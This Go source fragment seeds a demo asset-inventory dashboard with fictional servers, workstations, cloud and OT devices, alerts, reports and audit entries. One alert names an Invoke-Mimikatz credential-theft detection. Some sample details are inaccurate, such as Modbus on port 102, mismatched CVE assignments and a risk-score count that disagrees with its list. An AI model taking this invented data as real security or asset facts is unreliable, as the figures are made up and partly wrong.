			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[445,135]`, runningServices: 44, swCount: 72,
			activeUsers: `["ceo@corp.local"]`, discoverySource: "EDR Agent", lastSeenMins: 12, firstSeenDays: 730,
		},
		{
			assetID: "ACE-WS-005", name: "WKSTN-FIN-ROGUE", hostname: "unknown-f3a9c",
			assetType: "endpoint", category: "windows", status: "online",
			owner: "", businessUnit: "Unknown", department: "",
			criticality: "critical", riskScore: 95, internetFacing: false, managed: false,
			location: "HQ Floor 3 (rogue — unregistered)", tags: `["unmanaged","shadow-it","investigate"]`,
			ipAddresses: `["10.20.47.199"]`, macAddress: "F0:3A:9C:1B:2D:3E",
			osName: "Windows 10 Pro", osVersion: "21H2", domain: "",
			serialNumber: "", manufacturer: "Unknown", model: "Unknown",
			cpuCores: 4, memoryGB: 8, diskGB: 256, diskUsedPct: 71, cpuUsagePct: 45, memoryUsagePct: 78,
			agentStatus: "none", patchStatus: "unknown", antivirusStatus: "unknown",
			firewallStatus: "unknown", backupStatus: "none", certExpiryDays: -1,
			openPorts: `[445,3389,4444]`, runningServices: 22, swCount: 0,
			activeUsers: `[]`, discoverySource: "Network Discovery (Nmap)", lastSeenMins: 47, firstSeenDays: 3,
		},
		// ── Servers ───────────────────────────────────────────────────────────
		{
			assetID: "ACE-SRV-001", name: "SQLDB-FIN-01", hostname: "SQLDB-FIN-01",
			assetType: "server", category: "windows", status: "online",
			owner: "dba-team", businessUnit: "Finance", department: "IT Operations",
			criticality: "critical", riskScore: 84, internetFacing: false, managed: true,
			location: "DC1 Rack A12", tags: `["database","finance","pci-dss","high-value"]`,
			ipAddresses: `["10.0.10.20","192.168.10.20"]`, macAddress: "00:AA:BB:CC:DD:EE",
			osName: "Windows Server 2022", osVersion: "21H2", domain: "CORP.LOCAL",
			serialNumber: "SRV-DB001-2022-0001", manufacturer: "Dell", model: "PowerEdge R750",
			cpuCores: 32, memoryGB: 256, diskGB: 8192, diskUsedPct: 43, cpuUsagePct: 38, memoryUsagePct: 71,
			agentStatus: "active", patchStatus: "behind", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: 18,
			openPorts: `[1433,445,135]`, runningServices: 24, swCount: 32,
			activeUsers: `["svc_sql","dba_admin"]`, discoverySource: "Active Directory", lastSeenMins: 0, firstSeenDays: 1095,
		},
		{
			assetID: "ACE-SRV-002", name: "APP-PROD-01", hostname: "APP-PROD-01",
			assetType: "server", category: "linux", status: "online",
			owner: "platform-team", businessUnit: "Engineering", department: "Platform",
			criticality: "critical", riskScore: 72, internetFacing: true, managed: true,
			location: "DC1 Rack B04", tags: `["production","web-tier","internet-facing"]`,
			ipAddresses: `["10.0.5.10","203.0.113.10"]`, macAddress: "00:BB:CC:DD:EE:FF",
			osName: "Ubuntu", osVersion: "22.04 LTS", domain: "",
			serialNumber: "SRV-APP001-2023-0002", manufacturer: "HPE", model: "ProLiant DL380 Gen10",
			cpuCores: 16, memoryGB: 64, diskGB: 2048, diskUsedPct: 55, cpuUsagePct: 62, memoryUsagePct: 74,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: 42,
			openPorts: `[80,443,22,8080]`, runningServices: 18, swCount: 214,
			activeUsers: `["deploy_svc","monitor_svc"]`, discoverySource: "EDR Agent", lastSeenMins: 0, firstSeenDays: 547,
		},
		{
			assetID: "ACE-SRV-003", name: "AD-DC-01", hostname: "AD-DC-01",
			assetType: "server", category: "windows", status: "online",
			owner: "it-ops", businessUnit: "IT", department: "Directory Services",
			criticality: "critical", riskScore: 88, internetFacing: false, managed: true,
			location: "DC1 Rack A01", tags: `["active-directory","domain-controller","critical-infra"]`,
			ipAddresses: `["10.0.0.10"]`, macAddress: "00:CC:DD:EE:FF:AA",
			osName: "Windows Server 2022", osVersion: "21H2", domain: "CORP.LOCAL",
			serialNumber: "SRV-DC001-2021-0001", manufacturer: "Dell", model: "PowerEdge R640",
			cpuCores: 16, memoryGB: 128, diskGB: 2048, diskUsedPct: 31, cpuUsagePct: 22, memoryUsagePct: 48,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: 7,
			openPorts: `[389,636,88,53,445,135]`, runningServices: 31, swCount: 28,
			activeUsers: `["krbtgt","Administrator","svc_backup"]`, discoverySource: "Active Directory", lastSeenMins: 0, firstSeenDays: 1825,
		},
		{
			assetID: "ACE-SRV-004", name: "SRV-DMZ-012", hostname: "SRV-DMZ-012",
			assetType: "server", category: "linux", status: "online",
			owner: "security-team", businessUnit: "IT Security", department: "Perimeter Security",
			criticality: "high", riskScore: 76, internetFacing: true, managed: true,
			location: "DC1 DMZ Rack C02", tags: `["dmz","reverse-proxy","internet-facing"]`,
			ipAddresses: `["10.0.100.12","203.0.113.12"]`, macAddress: "00:DD:EE:FF:AA:BB",
			osName: "CentOS", osVersion: "Stream 9", domain: "",
			serialNumber: "SRV-DMZ012-2023-0004", manufacturer: "HPE", model: "ProLiant DL360 Gen10",
			cpuCores: 8, memoryGB: 32, diskGB: 512, diskUsedPct: 28, cpuUsagePct: 18, memoryUsagePct: 31,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: 89,
			openPorts: `[80,443,22]`, runningServices: 12, swCount: 98,
			activeUsers: `["nginx_svc"]`, discoverySource: "Network Discovery (Nmap)", lastSeenMins: 0, firstSeenDays: 320,
		},
		{
			assetID: "ACE-SRV-005", name: "SRV-EOL-WIN2012", hostname: "SRV-EOL-WIN2012",
			assetType: "server", category: "windows", status: "online",
			owner: "legacy-apps", businessUnit: "Operations", department: "Legacy Systems",
			criticality: "critical", riskScore: 97, internetFacing: false, managed: true,
			location: "DC2 Rack Z01", tags: `["eol","legacy","critical-risk","no-patches"]`,
			ipAddresses: `["10.1.200.5"]`, macAddress: "00:EE:FF:AA:BB:CC",
			osName: "Windows Server 2012 R2", osVersion: "R2", domain: "CORP.LOCAL",
			serialNumber: "SRV-LEGACY001-2014-0001", manufacturer: "Dell", model: "PowerEdge R720",
			cpuCores: 8, memoryGB: 32, diskGB: 1024, diskUsedPct: 82, cpuUsagePct: 14, memoryUsagePct: 61,
			agentStatus: "inactive", patchStatus: "eol", antivirusStatus: "outdated",
			firewallStatus: "active", backupStatus: "none", certExpiryDays: -1,
			openPorts: `[445,135,3389,80]`, runningServices: 19, swCount: 41,
			activeUsers: `["legacy_svc","Administrator"]`, discoverySource: "Vulnerability Scanner", lastSeenMins: 15, firstSeenDays: 3285,
		},
		// ── Network ───────────────────────────────────────────────────────────
		{
			assetID: "ACE-NET-001", name: "FW-CORE-01", hostname: "FW-CORE-01",
			assetType: "network", category: "firewall", status: "online",
			owner: "network-team", businessUnit: "IT", department: "Network Engineering",
			criticality: "critical", riskScore: 55, internetFacing: true, managed: true,
			location: "DC1 Rack A00", tags: `["firewall","perimeter","critical-infra"]`,
			ipAddresses: `["10.0.0.1","203.0.113.1"]`, macAddress: "00:FF:AA:BB:CC:DD",
			osName: "Palo Alto PAN-OS", osVersion: "11.1.2", domain: "",
			serialNumber: "PA-5450-SN-2022-0001", manufacturer: "Palo Alto Networks", model: "PA-5450",
			cpuCores: 0, memoryGB: 0, diskGB: 0, diskUsedPct: 0, cpuUsagePct: 31, memoryUsagePct: 44,
			agentStatus: "none", patchStatus: "current", antivirusStatus: "not-applicable",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: 127,
			openPorts: `[443,22]`, runningServices: 0, swCount: 0,
			activeUsers: `[]`, discoverySource: "SNMP", lastSeenMins: 0, firstSeenDays: 730,
		},
		{
			assetID: "ACE-NET-002", name: "SW-CORE-01", hostname: "SW-CORE-01",
			assetType: "network", category: "switch", status: "online",
			owner: "network-team", businessUnit: "IT", department: "Network Engineering",
			criticality: "high", riskScore: 33, internetFacing: false, managed: true,
			location: "DC1 Rack A02", tags: `["core-switch","vlan-gateway"]`,
			ipAddresses: `["10.0.0.2"]`, macAddress: "00:11:22:33:44:55",
			osName: "Cisco IOS XE", osVersion: "17.9.4a", domain: "",
			serialNumber: "C9500-24Y4C-SN-2021-0001", manufacturer: "Cisco", model: "Catalyst 9500",
			cpuCores: 0, memoryGB: 0, diskGB: 0, diskUsedPct: 0, cpuUsagePct: 12, memoryUsagePct: 28,
			agentStatus: "none", patchStatus: "current", antivirusStatus: "not-applicable",
			firewallStatus: "not-applicable", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[22,23,161]`, runningServices: 0, swCount: 0,
			activeUsers: `[]`, discoverySource: "SNMP", lastSeenMins: 0, firstSeenDays: 1095,
		},
		// ── Cloud ─────────────────────────────────────────────────────────────
		{
			assetID: "ACE-CLD-001", name: "aws-prod-eks-node-01", hostname: "ip-10-0-1-101",
			assetType: "cloud", category: "aws", status: "online",
			owner: "platform-team", businessUnit: "Engineering", department: "Cloud Infrastructure",
			criticality: "high", riskScore: 44, internetFacing: false, managed: true,
			location: "AWS us-east-1 / subnet-prod-1a", tags: `["aws","eks","kubernetes","production"]`,
			ipAddresses: `["10.0.1.101"]`, macAddress: "",
			osName: "Amazon Linux", osVersion: "2023", domain: "",
			serialNumber: "i-0a1b2c3d4e5f6a7b8", manufacturer: "Amazon Web Services", model: "m6i.2xlarge",
			cpuCores: 8, memoryGB: 32, diskGB: 100, diskUsedPct: 41, cpuUsagePct: 52, memoryUsagePct: 68,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "not-applicable", certExpiryDays: -1,
			openPorts: `[443,10250]`, runningServices: 32, swCount: 189,
			activeUsers: `[]`, discoverySource: "AWS API", lastSeenMins: 0, firstSeenDays: 180,
		},
		{
			assetID: "ACE-CLD-002", name: "azure-vm-finance-prod", hostname: "azure-fin-01",
			assetType: "cloud", category: "azure", status: "online",
			owner: "finance-it", businessUnit: "Finance", department: "Finance IT",
			criticality: "high", riskScore: 58, internetFacing: false, managed: true,
			location: "Azure East US / rg-finance-prod", tags: `["azure","finance","vm","production"]`,
			ipAddresses: `["10.10.5.20"]`, macAddress: "",
			osName: "Windows Server 2022", osVersion: "Azure Edition", domain: "CORP.LOCAL",
			serialNumber: "azvm-fin-prod-01-2023", manufacturer: "Microsoft Azure", model: "Standard_D4s_v5",
			cpuCores: 4, memoryGB: 16, diskGB: 256, diskUsedPct: 48, cpuUsagePct: 24, memoryUsagePct: 55,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "active",
			firewallStatus: "active", backupStatus: "active", certExpiryDays: -1,
			openPorts: `[3389,445]`, runningServices: 22, swCount: 44,
			activeUsers: `["finance_svc"]`, discoverySource: "Azure API", lastSeenMins: 2, firstSeenDays: 240,
		},
		{
			assetID: "ACE-CLD-003", name: "k8s-pod-api-gateway-7f9d", hostname: "k8s-node-03",
			assetType: "cloud", category: "kubernetes", status: "online",
			owner: "platform-team", businessUnit: "Engineering", department: "Platform",
			criticality: "high", riskScore: 39, internetFacing: true, managed: true,
			location: "k8s / namespace: prod / deployment: api-gateway", tags: `["kubernetes","pod","api-gateway","internet-facing"]`,
			ipAddresses: `["172.20.1.47"]`, macAddress: "",
			osName: "Linux (Container)", osVersion: "Alpine 3.19", domain: "",
			serialNumber: "pod-api-gw-7f9d-ab12c3", manufacturer: "Kubernetes", model: "Pod",
			cpuCores: 2, memoryGB: 4, diskGB: 20, diskUsedPct: 12, cpuUsagePct: 37, memoryUsagePct: 44,
			agentStatus: "active", patchStatus: "current", antivirusStatus: "not-applicable",
			firewallStatus: "active", backupStatus: "not-applicable", certExpiryDays: 56,
			openPorts: `[8080,8443]`, runningServices: 4, swCount: 22,
			activeUsers: `[]`, discoverySource: "Kubernetes API", lastSeenMins: 0, firstSeenDays: 45,
		},
		// ── Applications ──────────────────────────────────────────────────────
		{
			assetID: "ACE-APP-001", name: "Salesforce CRM", hostname: "",
			assetType: "application", category: "saas", status: "online",
			owner: "sales-ops", businessUnit: "Sales", department: "Sales Operations",
			criticality: "high", riskScore: 41, internetFacing: true, managed: true,
			location: "Salesforce Cloud (US)", tags: `["saas","crm","customer-data","cloud-app"]`,
			ipAddresses: `[]`, macAddress: "",
			osName: "SaaS", osVersion: "Winter '25", domain: "corp.my.salesforce.com",
			serialNumber: "", manufacturer: "Salesforce", model: "Enterprise Edition",
			cpuCores: 0, memoryGB: 0, diskGB: 0, diskUsedPct: 0, cpuUsagePct: 0, memoryUsagePct: 0,
			agentStatus: "none", patchStatus: "managed-by-vendor", antivirusStatus: "not-applicable",
			firewallStatus: "not-applicable", backupStatus: "active", certExpiryDays: 182,
			openPorts: `[]`, runningServices: 0, swCount: 0,
			activeUsers: `["412 users"]`, discoverySource: "Manual", lastSeenMins: 5, firstSeenDays: 1460,
		},
		{
			assetID: "ACE-APP-002", name: "Jira / Confluence", hostname: "",
			assetType: "application", category: "saas", status: "online",
			owner: "it-ops", businessUnit: "Engineering", department: "IT Operations",
			criticality: "medium", riskScore: 27, internetFacing: true, managed: true,
			location: "Atlassian Cloud", tags: `["saas","project-management","documentation"]`,
			ipAddresses: `[]`, macAddress: "",
			osName: "SaaS", osVersion: "Cloud", domain: "corp.atlassian.net",
			serialNumber: "", manufacturer: "Atlassian", model: "Cloud",
			cpuCores: 0, memoryGB: 0, diskGB: 0, diskUsedPct: 0, cpuUsagePct: 0, memoryUsagePct: 0,
			agentStatus: "none", patchStatus: "managed-by-vendor", antivirusStatus: "not-applicable",
			firewallStatus: "not-applicable", backupStatus: "active", certExpiryDays: 340,
			openPorts: `[]`, runningServices: 0, swCount: 0,
			activeUsers: `["847 users"]`, discoverySource: "Manual", lastSeenMins: 0, firstSeenDays: 1825,
		},
		// ── OT/IoT ────────────────────────────────────────────────────────────
		{
			assetID: "ACE-OT-001", name: "BMS-HVAC-CTRL-01", hostname: "BMS-HVAC-01",
			assetType: "ot-iot", category: "building-management", status: "online",
			owner: "facilities", businessUnit: "Facilities", department: "Building Management",
			criticality: "medium", riskScore: 68, internetFacing: false, managed: true,
			location: "DC1 Mechanical Room", tags: `["ot","hvac","building-management","dc-cooling"]`,
			ipAddresses: `["192.168.200.10"]`, macAddress: "00:AB:CD:EF:12:34",
			osName: "Siemens Desigo CC", osVersion: "5.0", domain: "",
			serialNumber: "BMS-HVAC-2019-0001", manufacturer: "Siemens", model: "Desigo CC Controller",
			cpuCores: 2, memoryGB: 2, diskGB: 16, diskUsedPct: 22, cpuUsagePct: 8, memoryUsagePct: 31,
			agentStatus: "none", patchStatus: "unknown", antivirusStatus: "not-applicable",
			firewallStatus: "not-applicable", backupStatus: "none", certExpiryDays: -1,
			openPorts: `[80,102,4840]`, runningServices: 4, swCount: 0,
			activeUsers: `[]`, discoverySource: "Network Discovery (Nmap)", lastSeenMins: 5, firstSeenDays: 1460,
		},
		{
			assetID: "ACE-OT-002", name: "CCTV-NVR-01", hostname: "CCTV-NVR-01",
			assetType: "ot-iot", category: "surveillance", status: "online",
			owner: "physical-security", businessUnit: "Physical Security", department: "Security Operations",
			criticality: "low", riskScore: 44, internetFacing: false, managed: true,
			location: "DC1 Security Room", tags: `["iot","cctv","nvr","surveillance"]`,
			ipAddresses: `["192.168.201.5"]`, macAddress: "00:BC:DE:F0:23:45",
			osName: "Linux (Embedded)", osVersion: "4.14 (HIKVISION)", domain: "",
			serialNumber: "NVR-HIKV-2021-0001", manufacturer: "Hikvision", model: "DS-9664NI-I8",
			cpuCores: 4, memoryGB: 4, diskGB: 16384, diskUsedPct: 67, cpuUsagePct: 31, memoryUsagePct: 52,
			agentStatus: "none", patchStatus: "behind", antivirusStatus: "not-applicable",
			firewallStatus: "not-applicable", backupStatus: "not-applicable", certExpiryDays: -1,
			openPorts: `[80,443,8000,554]`, runningServices: 6, swCount: 0,
			activeUsers: `[]`, discoverySource: "Network Discovery (Nmap)", lastSeenMins: 30, firstSeenDays: 720,
		},
	}

	for _, a := range assets {
		lastSeen := now.Add(-time.Duration(a.lastSeenMins) * time.Minute)
		firstSeen := now.AddDate(0, 0, -a.firstSeenDays)
		db.Exec(`INSERT INTO ace_assets (
			tenant_id,asset_id,name,hostname,asset_type,category,status,
			owner,business_unit,department,criticality,risk_score,
			internet_facing,managed,location,tags,ip_addresses,mac_address,
			os_name,os_version,domain,serial_number,manufacturer,model,
			cpu_cores,memory_gb,disk_gb,disk_used_pct,cpu_usage_pct,memory_usage_pct,
			agent_status,patch_status,antivirus_status,firewall_status,backup_status,
			cert_expiry_days,open_ports,running_services,installed_software_count,
			active_users,discovery_source,last_seen_at,first_seen_at,created_at,updated_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,
			$19,$20,$21,$22,$23,$24,$25,$26,$27,$28,$29,$30,$31,$32,$33,$34,$35,$36,
			$37,$38,$39,$40,$41,$42,$43,$44,$44) ON CONFLICT (tenant_id,asset_id) DO NOTHING`,
			tid, a.assetID, a.name, exeNullStrSeed(a.hostname), a.assetType, a.category, a.status,
			exeNullStrSeed(a.owner), exeNullStrSeed(a.businessUnit), exeNullStrSeed(a.department),
			a.criticality, a.riskScore, a.internetFacing, a.managed,
			exeNullStrSeed(a.location), a.tags, a.ipAddresses, exeNullStrSeed(a.macAddress),
			exeNullStrSeed(a.osName), exeNullStrSeed(a.osVersion), exeNullStrSeed(a.domain),
			exeNullStrSeed(a.serialNumber), exeNullStrSeed(a.manufacturer), exeNullStrSeed(a.model),
			a.cpuCores, a.memoryGB, a.diskGB, a.diskUsedPct, a.cpuUsagePct, a.memoryUsagePct,
			a.agentStatus, a.patchStatus, a.antivirusStatus, a.firewallStatus, a.backupStatus,
			a.certExpiryDays, a.openPorts, a.runningServices, a.swCount,
			a.activeUsers, a.discoverySource, lastSeen, firstSeen,
		)
	}

	// ── Relationships ─────────────────────────────────────────────────────────

	type rel struct{ src, tgt, rtype, desc string }
	rels := []rel{
		{"ACE-WS-001", "ACE-SRV-001", "connects_to", "Finance workstation → Finance DB (write access)"},
		{"ACE-WS-001", "ACE-SRV-003", "authenticates_via", "Domain auth via AD DC"},
		{"ACE-WS-002", "ACE-SRV-003", "authenticates_via", "Domain auth via AD DC"},
		{"ACE-WS-003", "ACE-SRV-002", "deploys_to", "Dev workstation → App prod server (CI/CD)"},
		{"ACE-WS-004", "ACE-SRV-001", "connects_to", "Executive → Finance DB (read access)"},
		{"ACE-SRV-002", "ACE-SRV-001", "connects_to", "App server → Finance DB (service account)"},
		{"ACE-SRV-002", "ACE-SRV-003", "authenticates_via", "Service account AD auth"},
		{"ACE-SRV-004", "ACE-SRV-002", "routes_to", "DMZ proxy → App prod server"},
		{"ACE-NET-001", "ACE-SRV-004", "protects", "Perimeter firewall → DMZ server"},
		{"ACE-NET-002", "ACE-SRV-001", "connects_to", "Core switch → Finance DB (VLAN 20)"},
		{"ACE-NET-002", "ACE-SRV-002", "connects_to", "Core switch → App server (VLAN 10)"},
		{"ACE-NET-002", "ACE-SRV-003", "connects_to", "Core switch → AD DC (VLAN 1)"},
		{"ACE-CLD-001", "ACE-CLD-003", "hosts", "EKS node hosts API gateway pod"},
		{"ACE-CLD-002", "ACE-SRV-001", "connects_to", "Azure VM → on-prem Finance DB (VPN)"},
		{"ACE-SRV-001", "ACE-APP-001", "used_by", "Finance DB data syncs to Salesforce"},
	}
	for _, r := range rels {
		db.Exec(`INSERT INTO ace_relationships (tenant_id,source_id,target_id,relationship_type,description)
			VALUES ($1,$2,$3,$4,$5) ON CONFLICT (tenant_id,source_id,target_id,relationship_type) DO NOTHING`,
			tid, r.src, r.tgt, r.rtype, r.desc)
	}

	// ── Timeline events ───────────────────────────────────────────────────────

	type tlEvent struct {
		assetID   string
		etype     string
		summary   string
		actor     string
		severity  string
		details   string
		minsAgo   int
	}
	events := []tlEvent{
		{"ACE-WS-001", "alert", "Suspicious PowerShell execution detected", "CrowdStrike Falcon", "medium", "Script: Invoke-Mimikatz pattern matched (Sigma rule: PS_Credential_Theft)", 127},
		{"ACE-WS-001", "patch_missed", "3 critical patches overdue (30+ days)", "WSUS", "high", "CVE-2024-3400, CVE-2024-21762, CVE-2023-46805 — not applied", 2880},
		{"ACE-WS-001", "login", "User logged in from unusual location", "Auth System", "medium", "IP: 104.28.33.12 (Chicago, IL) — usual location: New York", 4320},
		{"ACE-WS-001", "policy_violation", "Disk encryption compliance failure detected", "Compliance Engine", "high", "BitLocker not enabled — PCI DSS requirement 3.5.1", 10080},
		{"ACE-SRV-001", "cert_expiry", "TLS certificate expiring in 18 days", "Certificate Monitor", "high", "CN=SQLDB-FIN-01.corp.local, expiry: 2025-02-04", 60},
		{"ACE-SRV-001", "patch_missed", "SQL Server 2022 patch MS24-001 overdue", "WSUS", "critical", "Addresses CVE-2024-21318 (CVSS 9.8) — remote code execution", 4320},
		{"ACE-SRV-001", "config_change", "Firewall rule added: allow 10.10.5.20:1433", "admin.jones", "info", "Azure Finance VM granted DB access via ticket CHG-2024-0892", 1440},
		{"ACE-SRV-002", "deploy", "Application deployment: v2.4.7 → v2.5.0", "CI/CD Pipeline", "info", "Deploy by: alex.chen, commit: a3f9d21, 0 errors", 480},
		{"ACE-SRV-002", "alert", "HTTP 500 errors spike: 847 errors in 5 min", "APM Monitor", "high", "Endpoint /api/v2/transactions — potential SQL injection probe", 712},
		{"ACE-SRV-003", "cert_expiry", "Domain Controller Kerberos cert expiring in 7 days", "Certificate Monitor", "critical", "CN=AD-DC-01.corp.local, Kerberos auth will fail if not renewed", 30},
		{"ACE-SRV-003", "login", "Admin login: schema change performed", "AD Audit", "high", "Actor: domain_admin — added new user to Domain Admins group", 2160},
		{"ACE-SRV-005", "vulnerability", "EOL OS: Windows Server 2012 R2 — no patches available", "Vulnerability Scanner", "critical", "Microsoft ended support Oct 2023. 47 CVEs have no patch.", 1440},
		{"ACE-WS-005", "discovery", "Rogue device detected on Finance subnet", "Network Discovery", "critical", "No EDR agent, no domain member, MAC not in inventory, ports 445+4444 open", 67},
		{"ACE-OT-001", "discovery", "OT device scanned — running unauthenticated Modbus on port 102", "Network Discovery", "high", "Siemens HVAC controller — critical facility system, no auth required for Modbus", 180},
		{"ACE-NET-001", "config_change", "Firewall policy update: Zone Internet → DMZ", "network-team", "info", "Added rule for new CDN service. Ticket: CHG-2024-1107", 720},
		{"ACE-CLD-001", "patch_applied", "Amazon Linux 2023 security updates applied", "AWS SSM Patch Manager", "info", "12 packages updated, 0 critical CVEs remaining", 240},
	}
	for _, e := range events {
		t := now.Add(-time.Duration(e.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO ace_timeline (tenant_id,asset_id,event_type,summary,actor,severity,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, e.assetID, e.etype, e.summary, e.actor, e.severity, e.details, t)
	}

	// ── Reports ───────────────────────────────────────────────────────────────

	type rpt struct{ id, title, rtype, by, format string; assetCnt int; daysAgo int }
	reports := []rpt{
		{"ACE-RPT-001", "Full Asset Inventory Q2 2025", "asset_inventory", "carol.kim", "pdf", 3448, 7},
		{"ACE-RPT-002", "Critical Asset Risk Report June 2025", "risk_report", "alice.zhang", "pdf", 89, 14},
		{"ACE-RPT-003", "Compliance Posture Assessment — PCI DSS", "compliance_report", "security-team", "pdf", 3448, 21},
		{"ACE-RPT-004", "Unmanaged Asset Discovery Report", "discovery_report", "david.chen", "csv", 34, 3},
		{"ACE-RPT-005", "Agent Coverage Gap Analysis", "health_report", "carol.kim", "xlsx", 3448, 28},
		{"ACE-RPT-006", "EOL Systems Remediation Plan", "vulnerability_report", "security-team", "pdf", 61, 35},
		{"ACE-RPT-007", "Q2 Executive CMDB Summary", "executive_summary", "ciso@corp.local", "pdf", 3448, 45},
		{"ACE-RPT-008", "Certificate Expiry Risk Report", "health_report", "it-ops", "csv", 28, 2},
	}
	for _, r := range reports {
		createdAt := now.AddDate(0, 0, -r.daysAgo)
		sizeB := int64(200000 + r.assetCnt*100)
		db.Exec(`INSERT INTO ace_reports (tenant_id,report_id,title,report_type,generated_by,format,size_bytes,asset_count,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9) ON CONFLICT (report_id) DO NOTHING`,
			tid, r.id, r.title, r.rtype, r.by, r.format, sizeB, r.assetCnt, createdAt)
	}

	// ── Notifications ─────────────────────────────────────────────────────────

	type notif struct{ etype, title, msg, severity, source, assetID string; minsAgo int }
	notifs := []notif{
		{"rogue_device", "Rogue Device Detected", "Unmanaged device detected on Finance subnet (10.20.47.199) — no EDR, ports 445+4444 open", "critical", "Network Discovery", "ACE-WS-005", 67},
		{"cert_expiry_critical", "AD Certificate Expiring in 7 Days", "Domain Controller AD-DC-01 Kerberos certificate expires in 7 days — Kerberos auth will fail", "critical", "Certificate Monitor", "ACE-SRV-003", 30},
		{"eol_os", "EOL Operating System: Windows Server 2012 R2", "SRV-EOL-WIN2012 is running Windows Server 2012 R2 (EOL Oct 2023) — 47 unpatched CVEs", "critical", "Vulnerability Scanner", "ACE-SRV-005", 1440},
		{"policy_violation", "Disk Encryption Violation: Finance Workstation", "WKSTN-FIN-047 has no BitLocker encryption — PCI DSS 3.5.1 violation", "high", "Compliance Engine", "ACE-WS-001", 10080},
		{"cert_expiry", "TLS Certificate Expiring in 18 Days", "SQLDB-FIN-01 TLS certificate expires 2025-02-04 — database connections will fail", "high", "Certificate Monitor", "ACE-SRV-001", 60},
		{"patch_overdue", "Critical Patches Overdue: Finance Workstation", "WKSTN-FIN-047 has 3 critical CVEs unpatched for 30+ days including CISA KEV CVE-2024-3400", "high", "Patch Manager", "ACE-WS-001", 2880},
		{"patch_overdue", "Critical DB Patch Overdue: CVE-2024-21318", "SQLDB-FIN-01 has MS24-001 (CVSS 9.8) overdue — RCE vulnerability in SQL Server 2022", "high", "Patch Manager", "ACE-SRV-001", 4320},
		{"new_discovery", "14 New Assets Discovered This Week", "AWS API discovered 8 new EC2 instances, DHCP discovered 6 new workstations — review and onboard", "medium", "Discovery Engine", "", 1440},
		{"agent_inactive", "EDR Agent Inactive: Legacy Server", "SRV-EOL-WIN2012 EDR agent has been inactive for 48 hours — endpoint unprotected", "high", "EDR Monitor", "ACE-SRV-005", 2880},
		{"ot_exposure", "OT Device Exposure: Unauthenticated Modbus", "BMS-HVAC-CTRL-01 has unauthenticated Modbus/TCP on port 102 — critical facility system", "high", "OT Scanner", "ACE-OT-001", 180},
		{"unmanaged_alert", "34 Unmanaged Assets Need Review", "Network discovery found 34 unmanaged assets not in CMDB — assign ownership and deploy agents", "medium", "Discovery Engine", "", 4320},
		{"high_risk_alert", "5 Assets with Risk Score > 90", "Critical risk assets require immediate remediation: WKSTN-FIN-ROGUE (95), AD-DC-01 (88), SRV-EOL (97)", "critical", "Risk Engine", "", 720},
	}
	for _, n := range notifs {
		t := now.Add(-time.Duration(n.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO ace_notifications (tenant_id,event_type,title,message,severity,source,asset_id,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
			tid, n.etype, n.title, n.msg, n.severity, n.source, exeNullStrSeed(n.assetID), t)
	}

	// ── Audit entries ─────────────────────────────────────────────────────────

	type aud struct{ action, otype, oid, oname, actor, ip, details string; minsAgo int }
	audits := []aud{
		{"asset_updated", "asset", "ACE-WS-001", "WKSTN-FIN-047", "carol.kim", "10.0.1.45", "criticality: medium → high, owner assigned: john.smith", 43200},
		{"asset_updated", "asset", "ACE-SRV-001", "SQLDB-FIN-01", "alice.zhang", "10.0.1.22", "cert_expiry_days updated: 45 → 18, alert triggered", 1440},
		{"bulk_operation", "assets", "", "12 assets", "carol.kim", "10.0.1.45", "op:assign_owner value:dba-team count:12", 10080},
		{"asset_viewed", "asset", "ACE-SRV-005", "SRV-EOL-WIN2012", "david.chen", "10.0.4.12", "Detail panel opened — EOL OS review", 720},
		{"report_generated", "report", "ACE-RPT-001", "Full Asset Inventory Q2 2025", "carol.kim", "10.0.1.45", "type:asset_inventory assets:3448", 10080},
		{"report_generated", "report", "ACE-RPT-002", "Critical Asset Risk Report", "alice.zhang", "10.0.1.22", "type:risk_report assets:89", 20160},
		{"asset_updated", "asset", "ACE-WS-005", "WKSTN-FIN-ROGUE", "security-team", "10.0.5.99", "tags updated: added investigate, quarantine flag set", 67},
		{"bulk_operation", "assets", "", "34 assets", "alice.zhang", "10.0.1.22", "op:update_criticality value:high count:34", 2880},
		{"asset_viewed", "asset", "ACE-OT-001", "BMS-HVAC-CTRL-01", "grace.lee", "10.0.3.88", "OT asset detail reviewed for compliance assessment", 180},
		{"report_generated", "report", "ACE-RPT-003", "Compliance Posture Assessment", "security-team", "10.0.5.99", "type:compliance_report assets:3448", 30240},
		{"asset_updated", "asset", "ACE-SRV-003", "AD-DC-01", "it-ops", "10.0.0.99", "cert_expiry alert acknowledged, renewal ticket created CHG-2025-0014", 45},
		{"dashboard_accessed", "dashboard", "", "Assets CMDB Dashboard", "carol.kim", "10.0.1.45", "Tab: inventory, filter: criticality=critical", 12},
	}
	for _, a := range audits {
		t := now.Add(-time.Duration(a.minsAgo) * time.Minute)
		db.Exec(`INSERT INTO ace_audit (tenant_id,action,object_type,object_id,object_name,actor,ip_address,details,created_at)
			VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9)`,
			tid, a.action, a.otype, exeNullStrSeed(a.oid), exeNullStrSeed(a.oname),
			a.actor, a.ip, a.details, t)
	}

	log.Printf("ACE seed: %d assets, %d relationships, %d timeline events, %d reports, %d notifications, %d audit",
		len(assets), len(rels), len(events), len(reports), len(notifs), len(audits))
}

// ── MDM Enterprise Seeder ─────────────────────────────────────────────────────

